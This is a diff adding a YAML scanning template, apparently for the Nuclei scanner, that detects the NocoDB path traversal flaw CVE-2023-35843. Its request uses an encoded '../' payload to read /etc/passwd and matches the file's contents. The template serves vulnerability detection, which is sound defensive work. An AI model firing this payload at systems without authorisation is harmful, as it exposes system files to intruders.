@@ -1,0 +1,28 @@
+id: cve-2023-35843
+info:
+  name: NocoDB Path Traversal Vulnerability (CVE-2023-35843)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: path-traversal,cve,cve-2023-35843
+  description: |
+    This template detects a path traversal vulnerability in NocoDB (CVE-2023-35843) that allows unauthorized access to sensitive files.
+
+http:
+  - method: GET
+    path:
+      - "/download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/bin"
+          - "root:"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
